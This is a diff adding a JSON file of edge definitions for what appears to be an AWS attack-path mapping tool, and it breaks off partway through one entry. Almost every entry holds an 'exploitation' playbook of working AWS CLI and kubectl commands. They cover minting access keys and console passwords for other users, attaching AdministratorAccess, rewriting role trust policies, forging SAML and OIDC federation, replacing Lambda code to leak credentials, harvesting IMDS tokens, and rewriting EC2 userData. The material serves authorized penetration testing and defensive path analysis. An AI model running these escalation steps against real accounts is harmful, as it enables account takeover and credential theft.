@@ -1,0 +1,249 @@
+{
+  "AWS_Contains": {
+    "description": "Structural containment edge from a container resource (an organization, account, S3 bucket, or EKS cluster) to a resource it owns. It is traversable so pathing can descend from a compromised container into the principals and resources scoped beneath it. Controlling the container does not by itself grant the target's permissions; it is a navigation edge the model walks to reach owned resources that have their own outbound capability edges.",
+    "required_edges": [],
+    "exploitation": "1. This is an ownership/navigation relationship, not a permission. Once you control the container (e.g. you have taken over an account or gained full control of a bucket), enumerate what it contains.\n2. For an account: aws iam list-users / list-roles / list-policies, and the per-service list APIs, to inventory the resources whose own edges you can now pursue.\n3. Continue the path through the contained resource's own outbound edges (e.g. a contained role you can assume, an instance you can run code on)."
+  },
+  "AWS_RunsAs": {
+    "description": "Connects a compute workload (Lambda function, CloudFormation stack, or EC2 instance) to the IAM role it executes as. If the workload is compromised — its code replaced, its template rewritten, or code execution obtained on the instance — the execution role's temporary credentials become available to the attacker, so the role is the next valid hop.",
+    "required_edges": [],
+    "exploitation": "1. Obtain code execution on the workload (see the edge that leads into it, e.g. AWS_CanUpdateLambdaCode, AWS_CanModifyEC2InstanceAttribute, AWS_SSMCanSendCommand, or AWS_CanUpdateCloudFormationStack).\n2. From inside the workload, retrieve the execution role's credentials. On EC2/EKS, read them from IMDS:\n     TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 600')\n     NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n     curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$NAME\n   In Lambda, the role's credentials are in the AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN environment variables.\n3. Export those credentials and operate as the execution role: aws sts get-caller-identity to confirm, then exercise its permissions."
+  },
+  "AWS_ClusterHasNodeGroup": {
+    "description": "Structural edge from an EKS cluster to one of its managed node groups. A Kubernetes administrator on the cluster can schedule pods onto any node group, so cluster control is modeled as a pivot into the node group (and, through AWS_NodeGroupHasRole, into the node IAM role the pods can reach via IMDS).",
+    "required_edges": [],
+    "exploitation": "1. With cluster-admin on the EKS cluster (see AWS_CanCreateAndAssociateEKSAccessEntry), configure kubectl:\n     aws eks update-kubeconfig --name <cluster-name> --region <region>\n2. Schedule a pod onto a node in the target node group (optionally with nodeSelector/affinity to pin it there), using hostNetwork so it shares the node's network path to IMDS:\n     kubectl run pwn --image=amazonlinux --overrides='{\"spec\":{\"hostNetwork\":true}}' -it -- bash\n3. From the pod, reach the node role through IMDS (see AWS_NodeGroupHasRole)."
+  },
+  "AWS_NodeGroupHasRole": {
+    "description": "Structural edge from an EKS managed node group to the IAM node role its instances run with. Pods scheduled onto the node group share the node's network namespace path to the Instance Metadata Service (unless IMDS access is explicitly blocked), so a pod can retrieve the node role's credentials. Node-group control is therefore a pivot into the node role.",
+    "required_edges": [],
+    "exploitation": "1. Get a shell in a pod on the node group (see AWS_ClusterHasNodeGroup).\n2. Query IMDS from the pod for the node role's credentials:\n     TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 600')\n     NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n     curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$NAME\n3. Export the returned credentials and act as the node role."
+  },
+  "AWS_CanCreateAccessKey": {
+    "description": "The source principal can call iam:CreateAccessKey for the target user. Creating an access key mints long-lived programmatic credentials for that user, giving the attacker durable API access as the target with all of its permissions — a direct identity takeover of the user.",
+    "required_edges": [],
+    "exploitation": "1. Mint a new access key for the target user:\n     aws --profile <attacker-profile> iam create-access-key --user-name <target-user>\n2. Capture AccessKeyId and SecretAccessKey from the output (a user is limited to two keys; delete one first with delete-access-key if needed).\n3. Configure a profile with the stolen key:\n     aws configure --profile pwned   # paste the key + secret\n4. Operate as the target user:\n     aws --profile pwned sts get-caller-identity"
+  },
+  "AWS_CanCreateLoginProfile": {
+    "description": "The source principal can call iam:CreateLoginProfile for the target user, which sets a console password for a user that has none. The attacker can then sign in to the AWS Management Console as the target user and exercise its permissions interactively — identity takeover of the user's console access.",
+    "required_edges": [],
+    "exploitation": "1. Set a console password for the target user:\n     aws --profile <attacker-profile> iam create-login-profile --user-name <target-user> --password '<NewP@ssw0rd!>' --no-password-reset-required\n2. Sign in to the console at https://<account-id>.signin.aws.amazon.com/console as <target-user> with that password.\n3. If the user has MFA enforced via policy condition, console actions may still be gated; otherwise you now act as the user. (Use AWS_CanUpdateLoginProfile instead if the user already has a profile.)"
+  },
+  "AWS_CanUpdateLoginProfile": {
+    "description": "The source principal can call iam:UpdateLoginProfile for the target user, resetting the password of a user that already has console access. The attacker takes over the target user's console session by setting a password it knows — identity takeover of the user.",
+    "required_edges": [],
+    "exploitation": "1. Reset the target user's console password to one you control:\n     aws --profile <attacker-profile> iam update-login-profile --user-name <target-user> --password '<NewP@ssw0rd!>' --no-password-reset-required\n2. Sign in to the console at https://<account-id>.signin.aws.amazon.com/console as <target-user>.\n3. You now operate as the target user (subject to any MFA condition on its policies)."
+  },
+  "AWS_CanUpdateSelfPolicy": {
+    "description": "Composite self-escalation to account takeover. The principal can rewrite a permission container it is itself subject to — its own inline or attached user/role policy, or a customer-managed policy attached to it directly or through a group — and grant itself an administrator-grade policy with no assume step. The edge targets the account root and is only emitted when the actor has no capping permissions boundary (a boundary would cap the rewritten policy), so the result is genuinely unbounded admin.",
+    "required_edges": [
+      "AWS_CanPutRolePolicy",
+      "AWS_CanAttachRolePolicy",
+      "AWS_CanPutUserPolicy",
+      "AWS_CanAttachUserPolicy",
+      "AWS_CanCreatePolicyVersion"
+    ],
+    "exploitation": "(At least one of the self-write methods below must be available — see the `methods` property for the usable one(s).)\n1. If you can attach a managed policy to yourself, attach AdministratorAccess:\n     aws --profile <attacker-profile> iam attach-user-policy --user-name <self-user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n   (or attach-role-policy --role-name <self-role> for a role.)\n2. If you can put an inline policy on yourself, write an allow-all policy:\n     aws --profile <attacker-profile> iam put-user-policy --user-name <self-user> --policy-name esc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n3. If you instead hold iam:CreatePolicyVersion on a customer-managed policy attached to you, publish a new default admin version:\n     aws --profile <attacker-profile> iam create-policy-version --policy-arn <attached-policy-arn> --set-as-default --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n4. Your effective permissions are now administrator over the account."
+  },
+  "AWS_CanUpdateOtherPolicy": {
+    "description": "Composite transitive escalation to account takeover through another principal. The source can both CONTROL a second principal (assume it if a role, or mint credentials for it if a user) and RE-PERMISSION that principal (put/attach a policy on it, or push a new version of a customer-managed policy attached to it). By granting the controlled principal admin and then acting as it, the source reaches account admin. The edge targets the account root and requires the controlled principal to have no capping permissions boundary.",
+    "required_edges": [
+      "AWS_CanAssumeRole",
+      "AWS_CanCreateAccessKey",
+      "AWS_CanCreateLoginProfile",
+      "AWS_CanUpdateLoginProfile",
+      "AWS_CanPutRolePolicy",
+      "AWS_CanAttachRolePolicy",
+      "AWS_CanPutUserPolicy",
+      "AWS_CanAttachUserPolicy",
+      "AWS_CanCreatePolicyVersion"
+    ],
+    "exploitation": "(Needs one CONTROL edge and one RE-PERMISSION edge onto the same destination principal `D`; the constituent edges survive in the graph for the exact pair.)\n1. Grant D administrator. If D is a role you can re-permission:\n     aws --profile <attacker-profile> iam attach-role-policy --role-name <D-role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n   If D is a user, use attach-user-policy / put-user-policy, or create-policy-version on a managed policy attached to D.\n2. Take control of D. If D is a role you can assume:\n     aws --profile <attacker-profile> sts assume-role --role-arn <D-role-arn> --role-session-name s\n   If D is a user, mint credentials (iam:CreateAccessKey) or set a console password (iam:CreateLoginProfile / UpdateLoginProfile).\n3. Operate as D, which now has administrator over the account."
+  },
+  "AWS_CanUpdateAssumeRolePolicyAndAssume": {
+    "description": "Composite edge: the source can rewrite the target role's trust policy (iam:UpdateAssumeRolePolicy) and also already holds sts:AssumeRole permission on it. By editing the trust document to trust itself and then assuming the role, the source reaches the role directly regardless of who the role previously trusted.",
+    "required_edges": [
+      "AWS_CanUpdateAssumeRolePolicy"
+    ],
+    "exploitation": "1. Overwrite the target role's trust policy so it trusts your principal:\n     aws --profile <attacker-profile> iam update-assume-role-policy --role-name <target-role> --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"<attacker-principal-arn>\"},\"Action\":\"sts:AssumeRole\"}]}'\n2. Assume the role:\n     aws --profile <attacker-profile> sts assume-role --role-arn <target-role-arn> --role-session-name s\n3. Export the returned temporary credentials and act as the role."
+  },
+  "AWS_CanCreateAndAssumeAdminRole": {
+    "description": "Composite account-takeover edge. The source can iam:CreateRole, attach an admin-grade policy to a new role (it holds attach/put on the role/* wildcard), and sts:AssumeRole. It therefore creates a fresh role whose trust policy trusts itself, grants it admin, and assumes it — account admin with no AWS service or iam:PassRole involved. Targets the account root.",
+    "required_edges": [
+      "AWS_CanCreateRole",
+      "AWS_CanAttachRolePolicyWildcard",
+      "AWS_CanPutRolePolicyWildcard"
+    ],
+    "exploitation": "1. Create a role that trusts your own principal:\n     aws --profile <attacker-profile> iam create-role --role-name pwned --assume-role-policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"<attacker-principal-arn>\"},\"Action\":\"sts:AssumeRole\"}]}'\n2. Attach administrator to it:\n     aws --profile <attacker-profile> iam attach-role-policy --role-name pwned --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n3. Assume it:\n     aws --profile <attacker-profile> sts assume-role --role-arn arn:aws:iam::<account-id>:role/pwned --role-session-name s\n4. Export the credentials — you are now administrator."
+  },
+  "AWS_CanCreateAndAccessAdminUser": {
+    "description": "Composite account-takeover edge — the user-side mirror of AWS_CanCreateAndAssumeAdminRole. The source can iam:CreateUser, grant the new user admin (iam:AttachUserPolicy or iam:PutUserPolicy on the user/* wildcard), and mint usable credentials for it (iam:CreateAccessKey or iam:CreateLoginProfile on user/*). It creates a fresh admin user it fully controls. There is no permissions boundary to cap a user the attacker authors. Targets the account root.",
+    "required_edges": [
+      "AWS_CanCreateUser"
+    ],
+    "exploitation": "1. Create a new user:\n     aws --profile <attacker-profile> iam create-user --user-name pwned\n2. Grant it administrator:\n     aws --profile <attacker-profile> iam attach-user-policy --user-name pwned --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n   (or put-user-policy with an allow-all inline document.)\n3. Mint credentials for it:\n     aws --profile <attacker-profile> iam create-access-key --user-name pwned\n4. Configure a profile with the new key and operate as an administrator:\n     aws --profile pwned sts get-caller-identity"
+  },
+  "AWS_CanCreateAndPassAdminRole": {
+    "description": "Merged account-takeover edge. The source can iam:CreateRole, attach an admin-grade policy to it, and iam:PassRole it to an AWS service (EC2, Lambda, CloudFormation, or EKS node group) that then runs as the role. By standing up such a workload it obtains execution as an admin role — account takeover. The `services` and `methods` properties record which service paths apply. Targets the account root and consolidates the per-service constituents below.",
+    "required_edges": [
+      "AWS_CanCreateAndPassEC2AdminRole",
+      "AWS_CanCreateAndPassLambdaAdminRole",
+      "AWS_CanCreateAndPassCloudFormationAdminRole",
+      "AWS_CanCreateAndPassEKSNodeGroupAdminRole"
+    ],
+    "exploitation": "Worked example via Lambda (see `services` for which apply):\n1. Create a role trusting lambda.amazonaws.com:\n     aws --profile <attacker-profile> iam create-role --role-name pwned --assume-role-policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"lambda.amazonaws.com\"},\"Action\":\"sts:AssumeRole\"}]}'\n2. Attach administrator:\n     aws --profile <attacker-profile> iam attach-role-policy --role-name pwned --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n3. Create a function that passes (iam:PassRole) the admin role and exfiltrates its credentials, then invoke it:\n     aws --profile <attacker-profile> lambda create-function --function-name x --runtime python3.12 --role arn:aws:iam::<account-id>:role/pwned --handler i.h --zip-file fileb://f.zip\n     aws --profile <attacker-profile> lambda invoke --function-name x out.json\n   (the handler reads AWS_SESSION_TOKEN etc. from its env). For EC2, instead RunInstances with the role as an instance profile and read IMDS; for CloudFormation, CreateStack with a resource that runs as the role."
+  },
+  "AWS_CanCreateOIDCProviderAndAssumeRole": {
+    "description": "Composite federation escalation. The source can create an IAM OIDC identity provider (iam:CreateOpenIDConnectProvider) and rewrite a role's trust policy (iam:UpdateAssumeRolePolicy). It registers an OIDC provider whose signing keys it controls, edits the target role's trust to trust that provider, and assumes the role with a web-identity token it mints — reaching the role via federation. Computed from raw permissions, so it has no pre-existing constituent graph edges.",
+    "required_edges": [],
+    "exploitation": "1. Stand up an OIDC issuer you control (a static https endpoint serving /.well-known/openid-configuration and a JWKS), then register it:\n     aws --profile <attacker-profile> iam create-open-id-connect-provider --url https://<oidc-url> --client-id-list sts.amazonaws.com --thumbprint-list <tls-thumbprint>\n2. Rewrite the target role's trust to trust that provider for a subject you will sign:\n     aws --profile <attacker-profile> iam update-assume-role-policy --role-name <target-role> --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Federated\":\"arn:aws:iam::<account-id>:oidc-provider/<oidc-url>\"},\"Action\":\"sts:AssumeRoleWithWebIdentity\"}]}'\n3. Mint a JWT signed by your issuer's key with the expected sub/aud, then assume the role:\n     aws sts assume-role-with-web-identity --role-arn <target-role-arn> --role-session-name s --web-identity-token <your-jwt>\n4. Export the returned credentials and act as the role."
+  },
+  "AWS_CanCreateSAMLProviderAndAssumeRole": {
+    "description": "Composite federation escalation — the SAML mirror of AWS_CanCreateOIDCProviderAndAssumeRole. The source can create an IAM SAML provider (iam:CreateSAMLProvider) and rewrite a role's trust policy (iam:UpdateAssumeRolePolicy). It registers a SAML IdP whose signing certificate it controls, edits the target role's trust to trust that provider, and assumes the role with a SAML assertion it forges. Computed from raw permissions, so it has no pre-existing constituent graph edges.",
+    "required_edges": [],
+    "exploitation": "1. Generate a SAML IdP metadata document with a signing certificate whose private key you hold, and register it:\n     aws --profile <attacker-profile> iam create-saml-provider --name evil --saml-metadata-document file://<saml-metadata.xml>\n2. Rewrite the target role's trust to trust that provider:\n     aws --profile <attacker-profile> iam update-assume-role-policy --role-name <target-role> --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Federated\":\"arn:aws:iam::<account-id>:saml-provider/evil\"},\"Action\":\"sts:AssumeRoleWithSAML\"}]}'\n3. Forge and sign a SAML assertion for the role, then assume it:\n     aws sts assume-role-with-saml --role-arn <target-role-arn> --principal-arn arn:aws:iam::<account-id>:saml-provider/evil --saml-assertion <base64-signed-assertion>\n4. Export the returned credentials and act as the role."
+  },
+  "AWS_CanUpdateSAMLProvider": {
+    "description": "The source can call iam:UpdateSAMLProvider on the target SAML provider, replacing its metadata (including the signing certificate). By swapping in a certificate it controls, the attacker can forge assertions the provider will validate, and any role that trusts this provider for sts:AssumeRoleWithSAML becomes reachable. The provider is modeled as a usable foothold for this reason.",
+    "required_edges": [],
+    "exploitation": "1. Build a SAML metadata document containing a signing certificate whose private key you control.\n2. Overwrite the provider's metadata:\n     aws --profile <attacker-profile> iam update-saml-provider --saml-provider-arn <saml-provider-arn> --saml-metadata-document file://<evil-metadata.xml>\n3. Identify a role that trusts this provider (its trust policy names the provider ARN) and forge a signed assertion for it.\n4. Assume that role:\n     aws sts assume-role-with-saml --role-arn <target-role-arn> --principal-arn <saml-provider-arn> --saml-assertion <base64-assertion>"
+  },
+  "AWS_CanUpdateOIDCProviderThumbprint": {
+    "description": "The source can call iam:UpdateOpenIDConnectProviderThumbprint on the target OIDC provider, changing the TLS thumbprint AWS uses to validate the issuer. By pointing the thumbprint at infrastructure it controls, the attacker can have AWS accept tokens it signs, making any role that trusts this provider for sts:AssumeRoleWithWebIdentity reachable. The provider is modeled as a usable foothold for this reason.",
+    "required_edges": [],
+    "exploitation": "1. Stand up an issuer endpoint you control whose TLS certificate chain you can present, and compute its thumbprint.\n2. Update the provider's thumbprint to match your endpoint:\n     aws --profile <attacker-profile> iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <oidc-provider-arn> --thumbprint-list <your-thumbprint>\n3. Mint a JWT signed by your issuer with the sub/aud a target role's trust expects, then assume that role:\n     aws sts assume-role-with-web-identity --role-arn <target-role-arn> --role-session-name s --web-identity-token <your-jwt>"
+  },
+  "AWS_CanCreateEKSPodIdentityAssociation": {
+    "description": "The source can create an EKS Pod Identity association for the target role, pass that role to pods.eks.amazonaws.com, and obtain cluster-admin Kubernetes access through an existing or self-created/upgraded EKS access entry. It can therefore launch a pod using the associated service account and receive the target role's credentials from the EKS Pod Identity Agent.",
+    "required_edges": [],
+    "exploitation": "1. Create a Pod Identity association mapping a namespace/service account to the target role:\n     aws --profile <attacker-profile> eks create-pod-identity-association --cluster-name <cluster-name> --namespace default --service-account pwned --role-arn <target-role-arn> --region <region>\n2. With cluster access, create that service account and run a pod using it:\n     kubectl create serviceaccount pwned\n     kubectl run pwn --image=amazonlinux --overrides='{\"spec\":{\"serviceAccountName\":\"pwned\"}}' -it -- bash\n3. Inside the pod the role's credentials are delivered via the Pod Identity Agent (AWS_CONTAINER_CREDENTIALS_FULL_URI); use them to act as the role."
+  },
+  "AWS_CanCreateAndAssociateEKSAccessEntry": {
+    "description": "The source can call eks:CreateAccessEntry and eks:AssociateAccessPolicy on the target cluster, the IAM-side controls for EKS access entries. It creates an access entry for a principal it controls and associates the AmazonEKSClusterAdminPolicy, granting itself cluster-admin Kubernetes RBAC on the cluster — which opens further pivots into node groups and workload-mapped roles. Computed from raw permissions, so it has no pre-existing constituent graph edges.",
+    "required_edges": [],
+    "exploitation": "1. Create an access entry mapping your IAM principal into the cluster:\n     aws --profile <attacker-profile> eks create-access-entry --cluster-name <cluster-name> --principal-arn <attacker-principal-arn> --region <region>\n2. Associate cluster-admin with it:\n     aws --profile <attacker-profile> eks associate-access-policy --cluster-name <cluster-name> --principal-arn <attacker-principal-arn> --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy --access-scope type=cluster --region <region>\n3. Configure kubectl and confirm cluster-admin:\n     aws --profile <attacker-profile> eks update-kubeconfig --name <cluster-name> --region <region>\n     kubectl auth can-i '*' '*'\n4. From cluster-admin, pivot to node groups / workload roles."
+  },
+  "AWS_CanAssumeRole": {
+    "description": "The source principal can assume the target role. Cross-account and account-root delegation require both an identity-policy sts:AssumeRole grant and role trust; an exact same-account IAM principal ARN in the trust policy supplies the permission directly, subject to explicit identity/trust denies, an attached permissions boundary, and organization guardrails. This is a direct, standing identity pivot — no IAM change required — into the target role's permissions.",
+    "required_edges": [],
+    "exploitation": "1. Assume the role:\n     aws --profile <attacker-profile> sts assume-role --role-arn <target-role-arn> --role-session-name s\n   (add --serial-number/--token-code if the trust requires MFA, and --external-id if it requires one.)\n2. Export the returned AccessKeyId / SecretAccessKey / SessionToken.\n3. Operate as the role:\n     aws sts get-caller-identity"
+  },
+  "AWS_CanPassRoleToService": {
+    "description": "Merged PassRole escalation. The source can iam:PassRole the target role to an AWS service (EC2, Lambda, CloudFormation, SSM, or EKS) and stand up a workload that runs as it, thereby obtaining the role's credentials. The `services` property lists services the role already trusts (a direct pass); `services_via_trust_rewrite` lists services reachable only after first rewriting the role's trust via iam:UpdateAssumeRolePolicy; `methods` records which paths produced the edge. Consolidates the per-service AWS_CanPassRoleVia* constituents below.",
+    "required_edges": [
+      "AWS_CanPassRoleViaEC2",
+      "AWS_CanPassRoleViaEC2SpotInstances",
+      "AWS_CanPassRoleViaEC2Association",
+      "AWS_CanPassRoleViaLambda",
+      "AWS_CanPassRoleViaLambdaUpdate",
+      "AWS_CanPassRoleViaCloudFormation",
+      "AWS_CanPassRoleViaCloudFormationUpdate",
+      "AWS_CanPassRoleViaCloudFormationStackSet",
+      "AWS_CanPassRoleViaCloudFormationStackSetUpdate",
+      "AWS_CanPassRoleViaSSMAssociation",
+      "AWS_CanPassRoleViaSSMAssociationExisting",
+      "AWS_CanPassRoleViaSSMAutomation",
+      "AWS_CanPassRoleViaEKSNodeGroup"
+    ],
+    "exploitation": "Worked example via EC2 (consult `services`/`methods` for the paths that apply to this edge):\n1. Launch an instance with the target role as its instance profile:\n     aws --profile <attacker-profile> ec2 run-instances --image-id <ami> --instance-type t3.micro --iam-instance-profile Arn=<instance-profile-arn-for-role> --user-data file://exfil.sh\n2. From the instance (via user-data, SSM, or SSH) read the role's credentials from IMDS and use them.\n   Alternatively pass via Lambda (lambda create-function --role <target-role-arn> then invoke and read its env), or via CloudFormation CreateStack with a resource that assumes the role. If the role does not yet trust the service, first iam:update-assume-role-policy to add the service principal (see services_via_trust_rewrite)."
+  },
+  "AWS_CanAssumeRoleWithSAML": {
+    "description": "The source is a SAML identity provider that the target role trusts for sts:AssumeRoleWithSAML. Anyone able to produce a valid assertion from that provider (e.g. a compromised IdP, or an attacker who can rewrite the provider's signing certificate via AWS_CanUpdateSAMLProvider) can obtain the role directly through federation.",
+    "required_edges": [],
+    "exploitation": "1. Produce a SAML assertion the provider will sign/validate for the target role (requires control of, or a valid login to, the trusted IdP).\n2. Exchange it for role credentials:\n     aws sts assume-role-with-saml --role-arn <target-role-arn> --principal-arn <saml-provider-arn> --saml-assertion <base64-assertion>\n3. Export the returned credentials and act as the role."
+  },
+  "AWS_CanAssumeRoleWithWebIdentity": {
+    "description": "The source is an OIDC identity provider that the target role trusts for sts:AssumeRoleWithWebIdentity. Anyone able to mint a valid token from that provider for the subject/audience the role's trust expects (e.g. a compromised issuer, or an attacker who can rewrite the provider's thumbprint via AWS_CanUpdateOIDCProviderThumbprint) can obtain the role directly through federation.",
+    "required_edges": [],
+    "exploitation": "1. Obtain or mint an OIDC token from the trusted provider matching the sub/aud condition in the role's trust policy.\n2. Exchange it for role credentials:\n     aws sts assume-role-with-web-identity --role-arn <target-role-arn> --role-session-name s --web-identity-token <jwt>\n3. Export the returned credentials and act as the role."
+  },
+  "AWS_CanUpdateLambdaCode": {
+    "description": "The source can call lambda:UpdateFunctionCode on the target function, replacing its deployment package with arbitrary code. The next invocation runs the attacker's code as the function's execution role, so the path continues into that role through AWS_RunsAs.",
+    "required_edges": [],
+    "exploitation": "1. Build a malicious deployment package that exfiltrates the role credentials from its environment:\n     echo 'def h(e,c):\\n import os;return {k:v for k,v in os.environ.items() if \"AWS_\" in k}' > i.py && zip f.zip i.py\n2. Replace the function code:\n     aws --profile <attacker-profile> lambda update-function-code --function-name <function-name> --zip-file fileb://f.zip\n3. Trigger it (or wait for its normal trigger) and read the output:\n     aws --profile <attacker-profile> lambda invoke --function-name <function-name> out.json && cat out.json\n4. Use the leaked AWS_SESSION_TOKEN credentials to act as the execution role."
+  },
+  "AWS_CanUpdateLambdaConfiguration": {
+    "description": "The source can call lambda:UpdateFunctionConfiguration on the target function. Configuration changes can subvert execution — altering environment variables, handler, layers, or even the execution role — so the function is treated as compromised and the path continues into its execution role through AWS_RunsAs.",
+    "required_edges": [],
+    "exploitation": "1. Identify a layer or handler you can influence, or change the function's environment to redirect its behaviour. For example, point the handler at attacker-supplied code shipped via a layer:\n     aws --profile <attacker-profile> lambda update-function-configuration --function-name <function-name> --layers <attacker-layer-arn> --handler evil.h\n2. Invoke the function so the new configuration executes as the execution role:\n     aws --profile <attacker-profile> lambda invoke --function-name <function-name> out.json\n3. Capture the execution role's credentials from your injected code and act as the role."
+  },
+  "AWS_LambdaFunctionWrite": {
+    "description": "Meta edge collapsing the Lambda primitives that let a principal take over a function's execution (update its code or configuration, invoke it). It remains traversable because it subsumes the already-traversable function-compromise edges, and the path continues into the function's execution role through AWS_RunsAs.",
+    "required_edges": [
+      "AWS_CanUpdateLambdaCode",
+      "AWS_CanUpdateLambdaConfiguration",
+      "AWS_CanInvokeLambdaFunction"
+    ],
+    "exploitation": "1. Use the strongest constituent you hold. Typically lambda:UpdateFunctionCode to replace the package (see AWS_CanUpdateLambdaCode), then invoke:\n     aws --profile <attacker-profile> lambda update-function-code --function-name <function-name> --zip-file fileb://f.zip\n     aws --profile <attacker-profile> lambda invoke --function-name <function-name> out.json\n2. Recover the execution role's credentials from the run and act as the role."
+  },
+  "AWS_LambdaFunctionAll": {
+    "description": "Meta edge collapsing full control of a Lambda function (the write primitives plus permission/event-source/URL/delete controls). It remains traversable because it subsumes the already-traversable function-compromise edges; the path continues into the function's execution role through AWS_RunsAs.",
+    "required_edges": [
+      "AWS_CanUpdateLambdaCode",
+      "AWS_CanUpdateLambdaConfiguration",
+      "AWS_CanInvokeLambdaFunction",
+      "AWS_CanAddLambdaPermission",
+      "AWS_CanRemoveLambdaPermission",
+      "AWS_CanCreateLambdaEventSource",
+      "AWS_CanUpdateLambdaURLConfig",
+      "AWS_CanDeleteLambdaFunction"
+    ],
+    "exploitation": "1. With full control of the function, replace its code and invoke it (see AWS_CanUpdateLambdaCode):\n     aws --profile <attacker-profile> lambda update-function-code --function-name <function-name> --zip-file fileb://f.zip\n     aws --profile <attacker-profile> lambda invoke --function-name <function-name> out.json\n2. You may also add a public function URL / resource policy (add-permission) for a durable trigger. Recover the execution role credentials from the run and act as the role."
+  },
+  "AWS_S3BucketAll": {
+    "description": "Meta edge collapsing full control of an S3 bucket — the access-policy controls (PutBucketPolicy, PutBucketAcl, PutBucketOwnershipControls, PutBucketPublicAccessBlock) plus the read/write/delete primitives. A principal who can rewrite the bucket policy and ACLs can grant itself any access to the bucket and its objects, so full bucket control is modeled as a pivot into the bucket and its contents.",
+    "required_edges": [
+      "AWS_CanPutBucketPolicy",
+      "AWS_CanPutBucketACL",
+      "AWS_CanPutBucketOwnershipControls",
+      "AWS_CanPutBucketPublicAccessBlock",
+      "AWS_CanGetBucketPolicy",
+      "AWS_CanGetBucketACL",
+      "AWS_CanListBucket",
+      "AWS_CanPutObject",
+      "AWS_CanDeleteBucketPolicy",
+      "AWS_CanDeleteBucket"
+    ],
+    "exploitation": "1. Rewrite the bucket policy to grant your principal full access:\n     aws --profile <attacker-profile> s3api put-bucket-policy --bucket <bucket> --policy '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"<attacker-principal-arn>\"},\"Action\":\"s3:*\",\"Resource\":[\"arn:aws:s3:::<bucket>\",\"arn:aws:s3:::<bucket>/*\"]}]}'\n2. Read, overwrite, or delete any object:\n     aws --profile <attacker-profile> s3 ls s3://<bucket>/\n     aws --profile <attacker-profile> s3 cp s3://<bucket>/<key> .\n3. If objects are consumed by other workloads (e.g. code/config buckets), overwriting them can pivot further."
+  },
+  "AWS_CanModifyEC2InstanceAttribute": {
+    "description": "The source can call ec2:ModifyInstanceAttribute on the target instance, which can rewrite its userData. Replacement userData runs as root on the next boot, giving code execution on the instance, so the path continues into the instance profile role through AWS_RunsAs.",
+    "required_edges": [],
+    "exploitation": "1. Stop the instance (userData can only be modified while stopped):\n     aws --profile <attacker-profile> ec2 stop-instances --instance-ids <instance-id>\n2. Overwrite its userData with a script that runs your payload on boot (base64-encoded), e.g. one that reads IMDS and exfiltrates the role credentials:\n     aws --profile <attacker-profile> ec2 modify-instance-attribute --instance-id <instance-id> --user-data Value=$(base64 -w0 boot.sh)\n3. Start the instance:\n     aws --profile <attacker-profile> ec2 start-instances --instance-ids <instance-id>\n4. Your script runs as root on boot; collect the instance profile role's credentials and act as the role."
+  },
+  "AWS_EC2CanVolumeSwap": {
+    "description": "Composite instance-compromise edge. The source holds ec2:StopInstances, DetachVolume, AttachVolume, and StartInstances on an EBS-root instance. By stopping the instance, detaching its root volume, attaching a volume it controls (or modifying the detached one), and restarting, the attacker gains code execution as the instance profile role — so the path continues through AWS_RunsAs. Computed from the four raw permissions, so it has no pre-existing constituent graph edges.",
+    "required_edges": [],
+    "exploitation": "1. Stop the target instance:\n     aws --profile <attacker-profile> ec2 stop-instances --instance-ids <instance-id>\n2. Detach its root volume:\n     aws --profile <attacker-profile> ec2 detach-volume --volume-id <root-volume-id>\n3. Attach a volume you control (e.g. one built from your own AMI, with a backdoor / your SSH key baked in) at the root device name:\n     aws --profile <attacker-profile> ec2 attach-volume --instance-id <instance-id> --volume-id <attacker-volume-id> --device /dev/xvda\n4. Start the instance and access it (SSH/SSM); from there read the instance profile role's credentials from IMDS. The detached original volume can also be mounted elsewhere to read its data."
+  },
+  "AWS_SSMCanSendCommand": {
+    "description": "The source can call ssm:SendCommand against the target managed instance, which is remote code execution: SSM runs the supplied command (e.g. AWS-RunShellScript) as root/SYSTEM on the instance. The path continues into the instance profile role through AWS_RunsAs.",
+    "required_edges": [],
+    "exploitation": "1. Run a command on the instance via SSM:\n     aws --profile <attacker-profile> ssm send-command --instance-ids <instance-id> --document-name AWS-RunShellScript --parameters 'commands=[\"id\",\"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\"]'\n2. Read the result:\n     aws --profile <attacker-profile> ssm list-command-invocations --command-id <id> --details\n3. Use the harvested instance profile role credentials to act as the role."
+  },
+  "AWS_SSMCanStartSession": {
